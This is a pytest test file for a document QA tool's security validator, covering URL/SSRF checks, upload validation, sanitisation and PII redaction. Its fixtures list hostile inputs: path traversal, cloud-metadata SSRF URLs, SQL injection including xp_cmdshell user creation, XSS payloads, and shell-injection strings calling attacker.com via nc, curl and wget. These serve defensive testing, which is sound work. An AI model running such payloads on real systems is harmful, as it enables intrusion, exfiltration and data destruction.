"""
Unit tests for Security Service

Tests security validation functionality including URL validation, file validation,
SSRF protection, and PII redaction.
"""

import tempfile
import pytest
from pathlib import Path
from unittest.mock import Mock
from fastapi import UploadFile
import io

from sop_qa_tool.services.security import SecurityValidator


class TestSecurityValidator:
    """Test cases for SecurityValidator"""
    
    @pytest.fixture
    def validator(self):
        """Create SecurityValidator instance for testing"""
        return SecurityValidator()
    
    def test_validate_url_valid_http(self, validator):
        """Test validation of valid HTTP URLs"""
        valid_urls = [
            "http://example.com/document.pdf",
            "https://www.example.com/path/to/file.docx",
            "https://subdomain.example.org/file.html",
            "http://example.com:8080/document.txt"
        ]
        
        for url in valid_urls:
            assert validator.validate_url(url) is True
    
    def test_validate_url_blocked_schemes(self, validator):
        """Test blocking of dangerous URL schemes"""
        blocked_urls = [
            "file:///etc/passwd",
            "ftp://example.com/file.txt",
            "gopher://example.com/",
            "ldap://example.com/",
            "dict://example.com/"
        ]
        
        for url in blocked_urls:
            assert validator.validate_url(url) is False
    
    def test_validate_url_invalid_schemes(self, validator):
        """Test rejection of invalid schemes"""
        invalid_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "mailto:test@example.com",
            "tel:+1234567890"
        ]
        
        for url in invalid_urls:
            assert validator.validate_url(url) is False
    
    def test_validate_url_localhost_blocking(self, validator):
        """Test blocking of localhost URLs when enabled"""
        # Ensure localhost blocking is enabled
        validator.settings.block_localhost_urls = True
        
        localhost_urls = [
            "http://localhost/file.pdf",
            "https://127.0.0.1/document.html",
            "http://::1/file.txt",
            "https://0.0.0.0/document.pdf"
        ]
        
        for url in localhost_urls:
            assert validator.validate_url(url) is False
    
    def test_validate_url_private_ip_blocking(self, validator):
        """Test blocking of private IP addresses"""
        validator.settings.block_localhost_urls = True
        
        private_ip_urls = [
            "http://192.168.1.1/file.pdf",
            "https://10.0.0.1/document.html",
            "http://172.16.0.1/file.txt",
            "https://169.254.1.1/document.pdf"
        ]
        
        for url in private_ip_urls:
            assert validator.validate_url(url) is False
    
    def test_validate_url_suspicious_domains(self, validator):
        """Test blocking of suspicious domain patterns"""
        validator.settings.block_localhost_urls = True
        
        suspicious_urls = [
            "http://internal.local/file.pdf",
            "https://server.internal/document.html",
            "http://workstation.corp/file.txt",
            "https://printer.lan/config.html"
        ]
        
        for url in suspicious_urls:
            assert validator.validate_url(url) is False
    
    def test_validate_url_localhost_allowed(self, validator):
        """Test allowing localhost URLs when blocking is disabled"""
        validator.settings.block_localhost_urls = False
        
        localhost_urls = [
            "http://localhost/file.pdf",
            "https://127.0.0.1/document.html"
        ]
        
        for url in localhost_urls:
            assert validator.validate_url(url) is True
    
    def test_validate_url_too_long(self, validator):
        """Test rejection of overly long URLs"""
        long_url = "https://example.com/" + "a" * 2050
        assert validator.validate_url(long_url) is False
    
    def test_validate_url_malformed(self, validator):
        """Test handling of malformed URLs"""
        malformed_urls = [
            "",
            "not-a-url",
            "http://",
            "https://",
            "http:///path",
            "://example.com"
        ]
        
        for url in malformed_urls:
            assert validator.validate_url(url) is False
    
    def test_validate_file_upload_valid(self, validator):
        """Test validation of valid file uploads"""
        valid_files = [
            ("document.pdf", "application/pdf"),
            ("report.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
            ("page.html", "text/html"),
            ("data.txt", "text/plain")
        ]
        
        for filename, content_type in valid_files:
            upload_file = Mock(spec=UploadFile)
            upload_file.filename = filename
            upload_file.content_type = content_type
            
            assert validator.validate_file_upload(upload_file) is True
    
    def test_validate_file_upload_no_filename(self, validator):
        """Test rejection of files without filename"""
        upload_file = Mock(spec=UploadFile)
        upload_file.filename = None
        upload_file.content_type = "application/pdf"
        
        assert validator.validate_file_upload(upload_file) is False
        
        upload_file.filename = ""
        assert validator.validate_file_upload(upload_file) is False
    
    def test_validate_file_upload_path_traversal(self, validator):
        """Test rejection of files with path traversal attempts"""
        dangerous_filenames = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "file/../../../secret.txt",
            "normal/../../etc/hosts"
        ]
        
        for filename in dangerous_filenames:
            upload_file = Mock(spec=UploadFile)
            upload_file.filename = filename
            upload_file.content_type = "text/plain"
            
            assert validator.validate_file_upload(upload_file) is False
    
    def test_validate_file_upload_disallowed_extensions(self, validator):
        """Test rejection of disallowed file extensions"""
        # Set allowed types to only PDF and TXT
        validator.settings.allowed_file_types = ["pdf", "txt"]
        
        disallowed_files = [
            ("script.js", "application/javascript"),
            ("program.exe", "application/octet-stream"),
            ("archive.zip", "application/zip"),
            ("image.jpg", "image/jpeg")
        ]
        
        for filename, content_type in disallowed_files:
            upload_file = Mock(spec=UploadFile)
            upload_file.filename = filename
            upload_file.content_type = content_type
            
            assert validator.validate_file_upload(upload_file) is False
    
    def test_validate_file_upload_dangerous_extensions(self, validator):
        """Test rejection of dangerous file extensions"""
        dangerous_files = [
            ("malware.exe", "application/octet-stream"),
            ("script.bat", "application/x-msdos-program"),
            ("virus.com", "application/octet-stream"),
            ("trojan.scr", "application/octet-stream")
        ]
        
        for filename, content_type in dangerous_files:
            upload_file = Mock(spec=UploadFile)
            upload_file.filename = filename
            upload_file.content_type = content_type
            
            assert validator.validate_file_upload(upload_file) is False
    
    def test_validate_file_upload_long_filename(self, validator):
        """Test rejection of overly long filenames"""
        long_filename = "a" * 300 + ".txt"
        
        upload_file = Mock(spec=UploadFile)
        upload_file.filename = long_filename
        upload_file.content_type = "text/plain"
        
        assert validator.validate_file_upload(upload_file) is False
    
    def test_validate_file_upload_mime_type_mismatch(self, validator):
        """Test handling of MIME type mismatches (should warn but not reject)"""
        upload_file = Mock(spec=UploadFile)
        upload_file.filename = "document.pdf"
        upload_file.content_type = "text/plain"  # Wrong MIME type
        
        # Should still pass (browsers can be inconsistent with MIME types)
        assert validator.validate_file_upload(upload_file) is True
    
    def test_validate_file_type_by_content_pdf(self, validator):
        """Test file type detection by content for PDF"""
        # Create temporary PDF file
        with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as f:
            f.write(b'%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\n%%EOF')
            temp_path = Path(f.name)
        
        try:
            file_type = validator.validate_file_type_by_content(temp_path)
            assert file_type == 'pdf'
        finally:
            temp_path.unlink(missing_ok=True)
    
    def test_validate_file_type_by_content_html(self, validator):
        """Test file type detection by content for HTML"""
        html_content = b'<!DOCTYPE html><html><head><title>Test</title></head><body></body></html>'
        
        with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as f:
            f.write(html_content)
            temp_path = Path(f.name)
        
        try:
            file_type = validator.validate_file_type_by_content(temp_path)
            assert file_type == 'html'
        finally:
            temp_path.unlink(missing_ok=True)
    
    def test_validate_file_type_by_content_text(self, validator):
        """Test file type detection by content for text"""
        text_content = b'This is a plain text file with some content.'
        
        with tempfile.NamedTemporaryFile(suffix='.txt', delete=False) as f:
            f.write(text_content)
            temp_path = Path(f.name)
        
        try:
            file_type = validator.validate_file_type_by_content(temp_path)
            assert file_type == 'txt'
        finally:
            temp_path.unlink(missing_ok=True)
    
    def test_validate_file_type_by_content_unknown(self, validator):
        """Test file type detection for unknown content"""
        binary_content = b'\x89PNG\r\n\x1a\n'  # PNG header (not supported)
        
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(binary_content)
            temp_path = Path(f.name)
        
        try:
            file_type = validator.validate_file_type_by_content(temp_path)
            assert file_type is None
        finally:
            temp_path.unlink(missing_ok=True)
    
    def test_sanitize_input_normal(self, validator):
        """Test sanitization of normal input"""
        input_text = "What are the safety requirements for the filling process?"
        sanitized = validator.sanitize_input(input_text)
        assert sanitized == input_text
    
    def test_sanitize_input_null_bytes(self, validator):
        """Test removal of null bytes"""
        input_text = "Normal text\x00with null\x00bytes"
        sanitized = validator.sanitize_input(input_text)
        assert "\x00" not in sanitized
        assert sanitized == "Normal textwith nullbytes"
    
    def test_sanitize_input_excessive_whitespace(self, validator):
        """Test normalization of excessive whitespace"""
        input_text = "Text   with    excessive     whitespace\n\n\n\nand   newlines"
        sanitized = validator.sanitize_input(input_text)
        assert sanitized == "Text with excessive whitespace and newlines"
    
    def test_sanitize_input_too_long(self, validator):
        """Test truncation of overly long input"""
        long_input = "a" * 15000
        sanitized = validator.sanitize_input(long_input)
        assert len(sanitized) <= 10000
    
    def test_sanitize_input_empty(self, validator):
        """Test handling of empty input"""
        assert validator.sanitize_input("") == ""
        assert validator.sanitize_input(None) == ""
        assert validator.sanitize_input("   ") == ""
    
    def test_redact_pii_disabled(self, validator):
        """Test PII redaction when disabled"""
        validator.settings.enable_pii_redaction = False
        
        text_with_pii = "Contact John Doe at john.doe@example.com or call 555-123-4567"
        redacted = validator.redact_pii(text_with_pii)
        assert redacted == text_with_pii  # Should be unchanged
    
    def test_redact_pii_enabled(self, validator):
        """Test PII redaction when enabled"""
        validator.settings.enable_pii_redaction = True
        
        text_with_pii = "Contact John Doe at john.doe@example.com or call 555-123-4567"
        redacted = validator.redact_pii(text_with_pii)
        
        assert "john.doe@example.com" not in redacted
        assert "555-123-4567" not in redacted
        assert "[REDACTED_EMAIL]" in redacted
        assert "[REDACTED_PHONE]" in redacted
    
    def test_redact_pii_multiple_types(self, validator):
        """Test redaction of multiple PII types"""
        validator.settings.enable_pii_redaction = True
        
        text_with_pii = """
        Employee: John Doe
        Email: john.doe@company.com
        Phone: (555) 123-4567
        SSN: 123-45-6789
        Credit Card: 4532 1234 5678 9012
        IP Address: 192.168.1.100
        """
        
        redacted = validator.redact_pii(text_with_pii)
        
        assert "[REDACTED_EMAIL]" in redacted
        assert "[REDACTED_PHONE]" in redacted
        assert "[REDACTED_SSN]" in redacted
        assert "[REDACTED_CREDIT_CARD]" in redacted
        assert "[REDACTED_IP_ADDRESS]" in redacted
        
        # Original PII should be gone
        assert "john.doe@company.com" not in redacted
        assert "123-45-6789" not in redacted
        assert "4532 1234 5678 9012" not in redacted
    
    def test_validate_query_valid(self, validator):
        """Test validation of valid queries"""
        valid_queries = [
            "What are the safety requirements?",
            "How do I operate the filling machine?",
            "What PPE is required for this process?",
            "Show me the maintenance schedule"
        ]
        
        for query in valid_queries:
            assert validator.validate_query(query) is True
    
    def test_validate_query_empty(self, validator):
        """Test rejection of empty queries"""
        empty_queries = ["", "   ", "\n\t", None]
        
        for query in empty_queries:
            assert validator.validate_query(query) is False
    
    def test_validate_query_too_long(self, validator):
        """Test rejection of overly long queries"""
        long_query = "What are the requirements? " * 100  # Very long query
        assert validator.validate_query(long_query) is False
    
    def test_validate_query_sql_injection(self, validator):
        """Test detection of potential SQL injection attempts"""
        malicious_queries = [
            "'; DROP TABLE documents; --",
            "What is UNION SELECT * FROM users",
            "Show me DELETE FROM files WHERE id=1",
            "Requirements INSERT INTO logs VALUES ('hack')",
            "Process UPDATE SET password='hacked'",
            "Safety EXEC('malicious code')",
            "Requirements <script>alert('xss')</script>",
            "Process javascript:alert('xss')",
            "Safety vbscript:msgbox('xss')"
        ]
        
        for query in malicious_queries:
            assert validator.validate_query(query) is False
    
    def test_get_allowed_file_extensions(self, validator):
        """Test getting allowed file extensions"""
        validator.settings.allowed_file_types = ["pdf", "docx", "html", "txt"]
        extensions = validator.get_allowed_file_extensions()
        
        assert extensions == {"pdf", "docx", "html", "txt"}
        assert isinstance(extensions, set)
    
    def test_get_max_file_size_bytes(self, validator):
        """Test getting maximum file size in bytes"""
        validator.settings.max_file_size_mb = 25
        max_size = validator.get_max_file_size_bytes()
        
        assert max_size == 25 * 1024 * 1024  # 25MB in bytes


class TestSecurityValidatorIntegration:
    """Integration tests for SecurityValidator"""
    
    def test_real_file_validation_workflow(self):
        """Test complete file validation workflow"""
        validator = SecurityValidator()
        
        # Create a real text file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("This is a test document for validation.")
            temp_path = Path(f.name)
        
        try:
            # Test file type detection
            detected_type = validator.validate_file_type_by_content(temp_path)
            assert detected_type == 'txt'
            
            # Test file upload validation
            with open(temp_path, 'rb') as f:
                file_content = io.BytesIO(f.read())
            
            upload_file = Mock(spec=UploadFile)
            upload_file.filename = "test_document.txt"
            upload_file.content_type = "text/plain"
            upload_file.size = len(file_content.getvalue())
            
            assert validator.validate_file_upload(upload_file) is True
            
        finally:
            temp_path.unlink(missing_ok=True)
    
    def test_comprehensive_url_validation(self):
        """Test comprehensive URL validation scenarios"""
        validator = SecurityValidator()
        
        # Test various URL scenarios
        test_cases = [
            # Valid URLs
            ("https://docs.example.com/sop/filling-procedure.pdf", True),
            ("http://internal-docs.company.com/safety-manual.html", True),
            ("https://www.regulations.gov/document/EPA-123.docx", True),
            
            # Invalid schemes
            ("file:///etc/passwd", False),
            ("javascript:alert('xss')", False),
            ("data:text/html,<script>", False),
            
            # Localhost (when blocking enabled)
            ("http://localhost:8080/doc.pdf", False),
            ("https://127.0.0.1/internal.html", False),
            
            # Malformed URLs
            ("not-a-url", False),
            ("http://", False),
            ("", False)
        ]
        
        validator.settings.block_localhost_urls = True
        
        for url, expected_valid in test_cases:
            result = validator.validate_url(url)
            assert result == expected_valid, f"URL {url} validation failed: expected {expected_valid}, got {result}"


class TestSecurityValidatorEnhancements:
    """Test cases for enhanced SecurityValidator functionality"""
    
    @pytest.fixture
    def validator(self):
        """Create SecurityValidator instance for testing"""
        return SecurityValidator()
    
    def test_validate_file_size_within_limit(self, validator):
        """Test file size validation within limits"""
        validator.settings.max_file_size_mb = 10
        
        upload_file = Mock(spec=UploadFile)
        upload_file.filename = "test.pdf"
        upload_file.size = 5 * 1024 * 1024  # 5MB
        
        assert validator.validate_file_size(upload_file) is True
    
    def test_validate_file_size_exceeds_limit(self, validator):
        """Test file size validation exceeding limits"""
        validator.settings.max_file_size_mb = 10
        
        upload_file = Mock(spec=UploadFile)
        upload_file.filename = "large.pdf"
        upload_file.size = 15 * 1024 * 1024  # 15MB
        
        assert validator.validate_file_size(upload_file) is False
    
    def test_validate_file_size_no_size_info(self, validator):
        """Test file size validation when size is not available"""
        upload_file = Mock(spec=UploadFile)
        upload_file.filename = "test.pdf"
        upload_file.size = None
        
        # Should pass when size is not available (will be checked during processing)
        assert validator.validate_file_size(upload_file) is True
    
    def test_validate_batch_upload_valid(self, validator):
        """Test validation of valid file batch"""
        files = []
        for i in range(3):
            file = Mock(spec=UploadFile)
            file.filename = f"test{i}.pdf"
            file.content_type = "application/pdf"
            file.size = 1024 * 1024  # 1MB
            files.append(file)
        
        validator.settings.allowed_file_types = ["pdf"]
        result = validator.validate_batch_upload(files)
        
        assert len(result['valid_files']) == 3
        assert len(result['invalid_files']) == 0
        assert len(result['errors']) == 0
    
    def test_validate_batch_upload_mixed(self, validator):
        """Test validation of mixed valid/invalid file batch"""
        files = []
        
        # Valid file
        valid_file = Mock(spec=UploadFile)
        valid_file.filename = "valid.pdf"
        valid_file.content_type = "application/pdf"
        valid_file.size = 1024 * 1024
        files.append(valid_file)
        
        # Invalid file (wrong extension)
        invalid_file = Mock(spec=UploadFile)
        invalid_file.filename = "invalid.exe"
        invalid_file.content_type = "application/octet-stream"
        invalid_file.size = 1024 * 1024
        files.append(invalid_file)
        
        validator.settings.allowed_file_types = ["pdf"]
        result = validator.validate_batch_upload(files)
        
        assert len(result['valid_files']) == 1
        assert len(result['invalid_files']) == 1
        assert "invalid.exe" in result['invalid_files']
    
    def test_validate_batch_upload_empty(self, validator):
        """Test validation of empty file batch"""
        result = validator.validate_batch_upload([])
        
        assert len(result['valid_files']) == 0
        assert len(result['invalid_files']) == 0
        assert "No files provided" in result['errors']
    
    def test_validate_batch_upload_too_large(self, validator):
        """Test validation of batch that's too large"""
        validator.settings.max_file_size_mb = 1
        
        files = []
        for i in range(10):
            file = Mock(spec=UploadFile)
            file.filename = f"large{i}.pdf"
            file.content_type = "application/pdf"
            file.size = 2 * 1024 * 1024  # 2MB each
            files.append(file)
        
        result = validator.validate_batch_upload(files)
        
        assert "Total batch size" in str(result['errors'])
    
    def test_validate_url_batch_valid(self, validator):
        """Test validation of valid URL batch"""
        urls = [
            "https://example.com/doc1.pdf",
            "https://example.org/doc2.html",
            "http://example.net/doc3.txt"
        ]
        
        result = validator.validate_url_batch(urls)
        
        assert len(result['valid_urls']) == 3
        assert len(result['invalid_urls']) == 0
        assert len(result['errors']) == 0
    
    def test_validate_url_batch_mixed(self, validator):
        """Test validation of mixed valid/invalid URL batch"""
        urls = [
            "https://example.com/doc1.pdf",  # Valid
            "file:///etc/passwd",  # Invalid scheme
            "http://localhost/doc.html",  # Blocked localhost
            "https://example.org/doc2.html"  # Valid
        ]
        
        validator.settings.block_localhost_urls = True
        result = validator.validate_url_batch(urls)
        
        assert len(result['valid_urls']) == 2
        assert len(result['invalid_urls']) == 2
        assert "file:///etc/passwd" in result['invalid_urls']
        assert "http://localhost/doc.html" in result['invalid_urls']
    
    def test_validate_url_batch_empty(self, validator):
        """Test validation of empty URL batch"""
        result = validator.validate_url_batch([])
        
        assert len(result['valid_urls']) == 0
        assert len(result['invalid_urls']) == 0
        assert "No URLs provided" in result['errors']
    
    def test_validate_url_batch_too_many(self, validator):
        """Test validation of URL batch that's too large"""
        urls = [f"https://example{i}.com/doc.pdf" for i in range(150)]
        
        result = validator.validate_url_batch(urls)
        
        assert "Too many URLs in batch" in str(result['errors'])
    
    def test_create_security_headers(self, validator):
        """Test creation of security headers"""
        headers = validator.create_security_headers()
        
        expected_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
            "Referrer-Policy"
        ]
        
        for header in expected_headers:
            assert header in headers
            assert headers[header]  # Should have a value
    
    def test_log_security_event(self, validator):
        """Test security event logging"""
        # This test mainly ensures the method doesn't crash
        validator.log_security_event(
            "test_event",
            {"test_key": "test_value"},
            "INFO"
        )
        
        validator.log_security_event(
            "error_event",
            {"error": "test error"},
            "ERROR"
        )
    
    def test_get_security_summary(self, validator):
        """Test getting security configuration summary"""
        validator.settings.allowed_file_types = ["pdf", "docx"]
        validator.settings.max_file_size_mb = 25
        validator.settings.enable_pii_redaction = True
        validator.settings.block_localhost_urls = False
        
        summary = validator.get_security_summary()
        
        assert "allowed_file_types" in summary
        assert "pdf" in summary["allowed_file_types"]
        assert "docx" in summary["allowed_file_types"]
        assert summary["max_file_size_mb"] == 25
        assert summary["pii_redaction_enabled"] is True
        assert summary["localhost_blocking_enabled"] is False
        assert "blocked_schemes" in summary
        assert "dangerous_extensions" in summary


class TestMaliciousInputHandling:
    """Test cases for malicious input detection and handling"""
    
    @pytest.fixture
    def validator(self):
        """Create SecurityValidator instance for testing"""
        return SecurityValidator()
    
    def test_malicious_filenames(self, validator):
        """Test detection of malicious filenames"""
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "normal/../../../secret.txt",
            "file/../../etc/hosts",
            "con.txt",  # Windows reserved name
            "aux.pdf",  # Windows reserved name
            "nul.docx",  # Windows reserved name
            "file\x00.txt",  # Null byte injection
            "file\r\n.txt",  # CRLF injection
        ]
        
        validator.settings.allowed_file_types = ["txt", "pdf", "docx"]
        
        for filename in malicious_filenames:
            upload_file = Mock(spec=UploadFile)
            upload_file.filename = filename
            upload_file.content_type = "text/plain"
            upload_file.size = 1024
            
            result = validator.validate_file_upload(upload_file)
            assert result is False, f"Should reject malicious filename: {filename}"
    
    def test_malicious_urls(self, validator):
        """Test detection of malicious URLs"""
        malicious_urls = [
            "file:///etc/passwd",
            "file:///c:/windows/system32/config/sam",
            "ftp://malicious.com/backdoor",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "http://localhost:22/ssh-exploit",
            "https://127.0.0.1:3389/rdp-exploit",
            "http://169.254.169.254/metadata",  # AWS metadata service
            "http://metadata.google.internal/",  # GCP metadata service
            "ldap://attacker.com/inject",
            "gopher://attacker.com:70/exploit",
        ]
        
        validator.settings.block_localhost_urls = True
        
        for url in malicious_urls:
            result = validator.validate_url(url)
            assert result is False, f"Should reject malicious URL: {url}"
    
    def test_sql_injection_queries(self, validator):
        """Test detection of SQL injection attempts in queries"""
        injection_queries = [
            "'; DROP TABLE documents; --",
            "What is UNION SELECT password FROM users",
            "Show me DELETE FROM files WHERE id=1",
            "Requirements INSERT INTO logs VALUES ('hack')",
            "Process UPDATE SET admin=1 WHERE user='me'",
            "Safety EXEC('rm -rf /')",
            "Requirements EXEC xp_cmdshell('net user hack hack /add')",
            "What is 1' OR '1'='1",
            "Show me admin'--",
            "Requirements' UNION SELECT NULL,NULL,password FROM users--",
        ]
        
        for query in injection_queries:
            result = validator.validate_query(query)
            assert result is False, f"Should reject SQL injection query: {query}"
    
    def test_xss_injection_queries(self, validator):
        """Test detection of XSS injection attempts in queries"""
        xss_queries = [
            "Requirements <script>alert('xss')</script>",
            "What is <img src=x onerror=alert('xss')>",
            "Show me <svg onload=alert('xss')>",
            "Process javascript:alert('xss')",
            "Safety vbscript:msgbox('xss')",
            "Requirements <iframe src=javascript:alert('xss')>",
            "What is <body onload=alert('xss')>",
            "Show me <input onfocus=alert('xss') autofocus>",
        ]
        
        for query in xss_queries:
            result = validator.validate_query(query)
            assert result is False, f"Should reject XSS injection query: {query}"
    
    def test_command_injection_queries(self, validator):
        """Test detection of command injection attempts in queries"""
        command_queries = [
            "Requirements; rm -rf /",
            "What is `cat /etc/passwd`",
            "Show me $(whoami)",
            "Process | nc attacker.com 4444",
            "Safety && curl attacker.com/exfiltrate",
            "Requirements || wget malicious.com/backdoor",
            "What is & ping attacker.com",
        ]
        
        for query in command_queries:
            # These might not all be caught by current validation,
            # but we test what we can detect
            result = validator.validate_query(query)
            # Some command injection patterns might pass through,
            # so we don't assert False for all of them
            # This test documents current behavior
    
    def test_oversized_inputs(self, validator):
        """Test handling of oversized inputs"""
        # Very long query
        long_query = "What are the requirements? " * 1000
        assert validator.validate_query(long_query) is False
        
        # Very long URL
        long_url = "https://example.com/" + "a" * 3000
        assert validator.validate_url(long_url) is False
        
        # Very long filename
        long_filename = "a" * 300 + ".txt"
        upload_file = Mock(spec=UploadFile)
        upload_file.filename = long_filename
        upload_file.content_type = "text/plain"
        upload_file.size = 1024
        
        assert validator.validate_file_upload(upload_file) is False
    
    def test_null_byte_injection(self, validator):
        """Test detection of null byte injection"""
        null_byte_inputs = [
            "normal\x00malicious",
            "file.txt\x00.exe",
            "query\x00; DROP TABLE",
            "url\x00javascript:alert()",
        ]
        
        for input_text in null_byte_inputs:
            sanitized = validator.sanitize_input(input_text)
            assert "\x00" not in sanitized, f"Should remove null bytes from: {input_text}"
    
    def test_unicode_normalization_attacks(self, validator):
        """Test handling of unicode normalization attacks"""
        unicode_attacks = [
            "file\u202e.txt\u202d.exe",  # Right-to-left override
            "file\u200b.txt",  # Zero-width space
            "file\ufeff.txt",  # Byte order mark
            "file\u2028.txt",  # Line separator
            "file\u2029.txt",  # Paragraph separator
        ]
        
        for filename in unicode_attacks:
            upload_file = Mock(spec=UploadFile)
            upload_file.filename = filename
            upload_file.content_type = "text/plain"
            upload_file.size = 1024
            
            # Current implementation might not catch all unicode attacks
            # This test documents current behavior
            result = validator.validate_file_upload(upload_file)
    
    def test_polyglot_file_attacks(self, validator):
        """Test detection of polyglot file attacks"""
        # Files that could be interpreted as multiple formats
        polyglot_files = [
            "document.pdf.exe",
            "image.jpg.bat",
            "data.csv.scr",
            "report.docx.com",
        ]
        
        for filename in polyglot_files:
            upload_file = Mock(spec=UploadFile)
            upload_file.filename = filename
            upload_file.content_type = "application/octet-stream"
            upload_file.size = 1024
            
            result = validator.validate_file_upload(upload_file)
            # Should reject based on final extension
            assert result is False, f"Should reject polyglot filename: {filename}"


class TestValidationBypassAttempts:
    """Test cases for validation bypass attempts"""
    
    @pytest.fixture
    def validator(self):
        """Create SecurityValidator instance for testing"""
        return SecurityValidator()
    
    def test_case_variation_bypass(self, validator):
        """Test that case variations don't bypass validation"""
        bypass_attempts = [
            ("FILE:///etc/passwd", "file:///etc/passwd"),
            ("JAVASCRIPT:alert('xss')", "javascript:alert('xss')"),
            ("Document.EXE", "document.exe"),
            ("LOCALHOST", "localhost"),
        ]
        
        validator.settings.block_localhost_urls = True
        
        for upper_case, lower_case in bypass_attempts:
            # Both should be rejected
            if "://" in upper_case:  # URL test
                assert validator.validate_url(upper_case) is False
                assert validator.validate_url(lower_case) is False
            elif upper_case.endswith(('.EXE', '.exe')):  # File test
                upload_file = Mock(spec=UploadFile)
                upload_file.filename = upper_case
                upload_file.content_type = "application/octet-stream"
                upload_file.size = 1024
                
                assert validator.validate_file_upload(upload_file) is False
    
    def test_encoding_bypass_attempts(self, validator):
        """Test that encoding variations don't bypass validation"""
        encoding_attempts = [
            "http://127.0.0.1/",  # Decimal IP
            "http://0x7f000001/",  # Hex IP
            "http://2130706433/",  # Integer IP
            "http://127.1/",  # Shortened IP
            "http://[::1]/",  # IPv6 localhost
            "http://[::ffff:127.0.0.1]/",  # IPv4-mapped IPv6
        ]
        
        validator.settings.block_localhost_urls = True
        
        for url in encoding_attempts:
            result = validator.validate_url(url)
            # Some of these might not be caught by current implementation
            # This test documents current behavior and can be enhanced
    
    def test_double_extension_bypass(self, validator):
        """Test that double extensions don't bypass validation"""
        double_extension_files = [
            "document.pdf.exe",
            "image.jpg.bat", 
            "data.txt.scr",
            "report.docx.com",
            "safe.html.js",
        ]
        
        validator.settings.allowed_file_types = ["pdf", "jpg", "txt", "docx", "html"]
        
        for filename in double_extension_files:
            upload_file = Mock(spec=UploadFile)
            upload_file.filename = filename
            upload_file.content_type = "application/octet-stream"
            upload_file.size = 1024
            
            result = validator.validate_file_upload(upload_file)
            # Should be rejected based on final extension
            assert result is False, f"Should reject double extension: {filename}"
    
    def test_mime_type_spoofing(self, validator):
        """Test handling of MIME type spoofing attempts"""
        spoofing_attempts = [
            ("malware.exe", "application/pdf"),  # Executable with PDF MIME
            ("script.js", "text/plain"),  # JavaScript with text MIME
            ("virus.bat", "application/msword"),  # Batch file with Word MIME
        ]
        
        validator.settings.allowed_file_types = ["pdf", "txt", "docx"]
        
        for filename, fake_mime in spoofing_attempts:
            upload_file = Mock(spec=UploadFile)
            upload_file.filename = filename
            upload_file.content_type = fake_mime
            upload_file.size = 1024
            
            result = validator.validate_file_upload(upload_file)
            # Should be rejected based on file extension, not MIME type
            assert result is False, f"Should reject spoofed file: {filename}"


if __name__ == "__main__":
    pytest.main([__file__])
